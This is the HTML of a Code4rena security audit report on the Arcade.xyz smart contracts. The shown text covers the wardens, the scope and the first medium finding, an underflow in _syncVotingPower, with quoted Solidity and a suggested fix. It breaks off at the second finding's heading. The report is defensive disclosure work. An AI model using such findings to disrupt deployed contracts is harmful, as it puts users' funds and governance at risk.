{
  "circa": {
    "title": "Arcade.xyz",
    "sponsor": "Arcade.xyz",
    "slug": "2023-07-arcade",
    "date": "2023-10-25",
    "findings": "https://github.com/code-423n4/2023-07-arcade-findings/issues",
    "contest": 264
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the audit outlined in this document, C4 conducted an analysis of the Arcade.xyz smart contract system written in Solidity. The audit took place between July 21 — July 28 2023.</p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>64 Wardens contributed reports to the Arcade.xyz:</p>\n<ol>\n<li><a href=\"https://code4rena.com/@DadeKuma\">DadeKuma</a></li>\n<li><a href=\"https://code4rena.com/@bart1e\">bart1e</a></li>\n<li><a href=\"https://code4rena.com/@ladboy233\">ladboy233</a></li>\n<li><a href=\"https://code4rena.com/@0x3b\">0x3b</a></li>\n<li><a href=\"https://code4rena.com/@osmanozdemir1\">osmanozdemir1</a></li>\n<li><a href=\"https://code4rena.com/@T1MOH\">T1MOH</a></li>\n<li><a href=\"https://code4rena.com/@bin2chen\">bin2chen</a></li>\n<li><a href=\"https://code4rena.com/@caventa\">caventa</a></li>\n<li><a href=\"https://code4rena.com/@0xWaitress\">0xWaitress</a></li>\n<li><a href=\"https://code4rena.com/@Juntao\">Juntao</a></li>\n<li><a href=\"https://code4rena.com/@Topmark\">Topmark</a></li>\n<li><a href=\"https://code4rena.com/@Jiamin\">Jiamin</a></li>\n<li><a href=\"https://code4rena.com/@crunch\">crunch</a></li>\n<li><a href=\"https://code4rena.com/@Anirruth\">Anirruth</a></li>\n<li><a href=\"https://code4rena.com/@K42\">K42</a></li>\n<li><a href=\"https://code4rena.com/@ktg\">ktg</a></li>\n<li><a href=\"https://code4rena.com/@0xnev\">0xnev</a></li>\n<li><a href=\"https://code4rena.com/@MohammedRizwan\">MohammedRizwan</a></li>\n<li><a href=\"https://code4rena.com/@Matin\">Matin</a></li>\n<li><a href=\"https://code4rena.com/@giovannidisiena\">giovannidisiena</a></li>\n<li><a href=\"https://code4rena.com/@rvierdiiev\">rvierdiiev</a></li>\n<li><a href=\"https://code4rena.com/@Udsen\">Udsen</a></li>\n<li><a href=\"https://code4rena.com/@Sathish9098\">Sathish9098</a></li>\n<li>UniversalCrypto (<a href=\"https://code4rena.com/@amaechieth\">amaechieth</a> and <a href=\"https://code4rena.com/@tettehnetworks\">tettehnetworks</a>)</li>\n<li><a href=\"https://code4rena.com/@vangrim\">vangrim</a></li>\n<li><a href=\"https://code4rena.com/@zaevlad\">zaevlad</a></li>\n<li><a href=\"https://code4rena.com/@auditsea\">auditsea</a></li>\n<li><a href=\"https://code4rena.com/@circlelooper\">circlelooper</a></li>\n<li><a href=\"https://code4rena.com/@lanrebayode77\">lanrebayode77</a></li>\n<li><a href=\"https://code4rena.com/@oakcobalt\">oakcobalt</a></li>\n<li><a href=\"https://code4rena.com/@kutugu\">kutugu</a></li>\n<li><a href=\"https://code4rena.com/@peanuts\">peanuts</a></li>\n<li><a href=\"https://code4rena.com/@3agle\">3agle</a></li>\n<li><a href=\"https://code4rena.com/@foxb868\">foxb868</a></li>\n<li><a href=\"https://code4rena.com/@c3phas\">c3phas</a></li>\n<li><a href=\"https://code4rena.com/@excalibor\">excalibor</a></li>\n<li><a href=\"https://code4rena.com/@dharma09\">dharma09</a></li>\n<li><a href=\"https://code4rena.com/@kaveyjoe\">kaveyjoe</a></li>\n<li><a href=\"https://code4rena.com/@Viktor_Cortess\">Viktor_Cortess</a></li>\n<li><a href=\"https://code4rena.com/@0xmuxyz\">0xmuxyz</a></li>\n<li><a href=\"https://code4rena.com/@0xbranded\">0xbranded</a></li>\n<li><a href=\"https://code4rena.com/@sces60107\">sces60107</a></li>\n<li><a href=\"https://code4rena.com/@BenRai\">BenRai</a></li>\n<li><a href=\"https://code4rena.com/@0xastronatey\">0xastronatey</a></li>\n<li>LaScaloneta (<a href=\"https://code4rena.com/@nicobevi\">nicobevi</a>, <a href=\"https://code4rena.com/@0x4non\">0x4non</a> and <a href=\"https://code4rena.com/@juancito\">juancito</a>)</li>\n<li>BugBusters (<a href=\"https://code4rena.com/@nirlin\">nirlin</a> and <a href=\"https://code4rena.com/@0xepley\">0xepley</a>)</li>\n<li><a href=\"https://code4rena.com/@QiuhaoLi\">QiuhaoLi</a></li>\n<li><a href=\"https://code4rena.com/@0xComfyCat\">0xComfyCat</a></li>\n<li><a href=\"https://code4rena.com/@zhaojie\">zhaojie</a></li>\n<li><a href=\"https://code4rena.com/@squeaky_cactus\">squeaky_cactus</a></li>\n<li><a href=\"https://code4rena.com/@SM3_SS\">SM3_SS</a></li>\n<li><a href=\"https://code4rena.com/@Aymen0909\">Aymen0909</a></li>\n<li><a href=\"https://code4rena.com/@Raihan\">Raihan</a></li>\n<li><a href=\"https://code4rena.com/@jeffy\">jeffy</a></li>\n<li><a href=\"https://code4rena.com/@ak1\">ak1</a></li>\n<li><a href=\"https://code4rena.com/@0xDING99YA\">0xDING99YA</a></li>\n<li><a href=\"https://code4rena.com/@immeas\">immeas</a></li>\n<li><a href=\"https://code4rena.com/@matrix_0wl\">matrix_0wl</a></li>\n<li><a href=\"https://code4rena.com/@koxuan\">koxuan</a></li>\n<li><a href=\"https://code4rena.com/@ABA\">ABA</a></li>\n</ol>\n<p>This audit was judged by <a href=\"https://code4rena.com/@0xean\">0xean</a>.</p>\n<p>Final report assembled by thebrittfactor.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 8 unique vulnerabilities. Of these vulnerabilities, 0 received a risk rating in the category of HIGH severity and 8 received a risk rating in the category of MEDIUM severity.</p>\n<p>Additionally, C4 analysis included 20 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 10 reports recommending gas optimizations.</p>\n<p>All of the issues presented here are linked back to their original finding.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2023-07-arcade\">C4 Arcade.xyz repository</a>, and is composed of 12 smart contracts written in the Solidity programming language and includes 979 lines of Solidity code.</p>\n<p>In addition to the known issues identified by the project team, a Code4rena bot race was conducted at the start of the audit. The winning bot, <strong>c4lanky</strong> from warden favelanky, generated the <a href=\"https://gist.github.com/itsmetechjay/e494eb18a34459c4d7841fc6fdc700e1\">Automated Findings report</a> and all findings therein were classified as out of scope.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code4rena.com\">the C4 website</a>, specifically our section on <a href=\"https://docs.code4rena.com/awarding/judging-criteria/severity-categorization\">Severity Categorization</a>.</p>\n<h1 id=\"medium-risk-findings-8\" style=\"position:relative;\"><a href=\"#medium-risk-findings-8\" aria-label=\"medium risk findings 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (8)</h1>\n<h2 id=\"m-01-_syncvotingpower-can-revert-in-underflow-in-nftboostvaultsol-and-arcdvestingvaultsol\" style=\"position:relative;\"><a href=\"#m-01-_syncvotingpower-can-revert-in-underflow-in-nftboostvaultsol-and-arcdvestingvaultsol\" aria-label=\"m 01 _syncvotingpower can revert in underflow in nftboostvaultsol and arcdvestingvaultsol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/572\">[M-01] <code>_syncVotingPower</code> can revert in underflow in <code>NFTBoostVault.sol</code> and <code>ARCDVestingVault.sol</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/572\">ladboy233</a>, also found by <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/540\">Topmark</a></em></p>\n<h3 id=\"lines-of-code\" style=\"position:relative;\"><a href=\"#lines-of-code\" aria-label=\"lines of code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Lines of code:</h3>\n<p><a href=\"https://github.com/code-423n4/2023-07-arcade/blob/f8ac4e7c4fdea559b73d9dd5606f618d4e6c73cd/contracts/NFTBoostVault.sol#L593\">https://github.com/code-423n4/2023-07-arcade/blob/f8ac4e7c4fdea559b73d9dd5606f618d4e6c73cd/contracts/NFTBoostVault.sol#L593</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-07-arcade/blob/f8ac4e7c4fdea559b73d9dd5606f618d4e6c73cd/contracts/ARCDVestingVault.sol#L352\">https://github.com/code-423n4/2023-07-arcade/blob/f8ac4e7c4fdea559b73d9dd5606f618d4e6c73cd/contracts/ARCDVestingVault.sol#L352</a></p>\n<h3 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Note this function:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_syncVotingPower</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">who</span><span class=\"mtk1\">, NFTBoostVaultStorage.Registration </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">registration</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">History</span><span class=\"mtk1\">.</span><span class=\"mtk12\">HistoricalBalances</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_votingPower</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">delegateeVotes</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\">.</span><span class=\"mtk11\">loadTop</span><span class=\"mtk1\">(</span><span class=\"mtk12\">registration</span><span class=\"mtk1\">.</span><span class=\"mtk12\">delegatee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newVotingPower</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_currentVotingPower</span><span class=\"mtk1\">(</span><span class=\"mtk12\">registration</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// get the change in voting power. Negative if the voting power is reduced</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">change</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newVotingPower</span><span class=\"mtk1\">) - </span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">registration</span><span class=\"mtk1\">.</span><span class=\"mtk12\">latestVotingPower</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// do nothing if there is no change</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">change</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">change</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\">.</span><span class=\"mtk11\">push</span><span class=\"mtk1\">(</span><span class=\"mtk12\">registration</span><span class=\"mtk1\">.</span><span class=\"mtk12\">delegatee</span><span class=\"mtk1\">, </span><span class=\"mtk12\">delegateeVotes</span><span class=\"mtk1\"> + </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">change</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// if the change is negative, we multiply by -1 to avoid underflow when casting</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\">.</span><span class=\"mtk11\">push</span><span class=\"mtk1\">(</span><span class=\"mtk12\">registration</span><span class=\"mtk1\">.</span><span class=\"mtk12\">delegatee</span><span class=\"mtk1\">, </span><span class=\"mtk12\">delegateeVotes</span><span class=\"mtk1\"> - </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">change</span><span class=\"mtk1\"> * -</span><span class=\"mtk7\">1</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">registration</span><span class=\"mtk1\">.</span><span class=\"mtk12\">latestVotingPower</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint128</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newVotingPower</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">VoteChange</span><span class=\"mtk1\">(</span><span class=\"mtk12\">who</span><span class=\"mtk1\">, </span><span class=\"mtk12\">registration</span><span class=\"mtk1\">.</span><span class=\"mtk12\">delegatee</span><span class=\"mtk1\">, </span><span class=\"mtk12\">change</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>We need to pay special attention to this line of code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\">.</span><span class=\"mtk11\">push</span><span class=\"mtk1\">(</span><span class=\"mtk12\">registration</span><span class=\"mtk1\">.</span><span class=\"mtk12\">delegatee</span><span class=\"mtk1\">, </span><span class=\"mtk12\">delegateeVotes</span><span class=\"mtk1\"> - </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">change</span><span class=\"mtk1\"> * -</span><span class=\"mtk7\">1</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<p>It is possible that <code>delegateeVotes</code> - changes can revert in underflow. This only happens when we try to reduce the voting power.</p>\n<p>In <code>_withdrawNFT</code>, if an NFT with a high multipler is removed in <code>NFTBoostVault.sol</code> it can cause the <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/f8ac4e7c4fdea559b73d9dd5606f618d4e6c73cd/contracts/NFTBoostVault.sol#L569\">voting power to decrease</a>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// update the delegatee&#39;s voting power based on multiplier removal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_syncVotingPower</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">registration</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Or, in <code>ARCDVestingVault.sol</code> when an admin tries to <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/f8ac4e7c4fdea559b73d9dd5606f618d4e6c73cd/contracts/ARCDVestingVault.sol#L175\">revoke a user’s grant</a>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// update the grant&#39;s withdrawn amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">withdrawable</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">grant</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawn</span><span class=\"mtk1\"> += </span><span class=\"mtk11\">uint128</span><span class=\"mtk1\">(</span><span class=\"mtk12\">withdrawable</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">} </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">grant</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawn</span><span class=\"mtk1\"> += </span><span class=\"mtk11\">uint128</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">withdrawable</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// update the user&#39;s voting power</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_syncVotingPower</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">grant</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Before calling <code>delegateeVotes - uint256(change * -1)</code>, make sure <code>delegateeVotes > uint256(change * -1)</code>, otherwise just set to 0.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/540#issuecomment-1665675383\">PowVT (Arcade.xyz) confirmed and commented via duplicate issue #540</a>:</strong></p>\n<blockquote>\n<p>Will look into underflow scenarios here where there is a multiplier boost.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-02-proposal-vote-power-can-be-easily-manipulated\" style=\"position:relative;\"><a href=\"#m-02-proposal-vote-power-can-be-easily-manipulated\" aria-label=\"m 02 proposal vote power can be easily manipulated permalink\" class=\"anchor before\"><svg 